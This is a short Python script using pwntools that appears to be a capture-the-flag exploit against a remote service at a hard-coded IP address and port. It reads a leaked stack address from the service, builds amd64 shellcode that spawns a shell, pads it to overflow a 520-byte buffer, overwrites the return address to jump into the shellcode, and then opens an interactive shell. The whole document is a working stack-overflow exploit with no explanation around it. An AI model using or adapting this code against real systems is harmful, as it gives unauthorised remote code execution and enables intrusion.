from pwn import *
import re
p = remote("207.154.239.148", 1337)
resp = p.recv()
leak = re.findall(b"(0x[0-9a-f]{4,16})", resp)[0]
shelladdr = int(leak, 16) - 540
context.arch = "amd64"
shellcode = asm(shellcraft.sh())
payload = shellcode + (520 - len(shellcode)) * b"A" + p64(shelladdr)
p.sendline(payload)
p.interactive()
